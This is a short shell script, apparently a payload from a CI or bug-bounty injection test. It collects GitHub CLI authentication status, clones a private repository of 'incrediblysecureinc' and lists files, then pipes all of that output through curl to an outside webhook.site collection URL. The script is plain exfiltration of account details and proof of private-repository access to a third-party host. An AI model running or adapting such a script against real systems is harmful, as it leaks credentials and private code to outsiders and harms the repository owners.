#!/bin/sh

gh auth status > out
gh repo clone incrediblysecureinc/comment-ops-private-amauricio >> out
la -la >> out
cat out | curl --data-urlencode time@-  https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22?second=

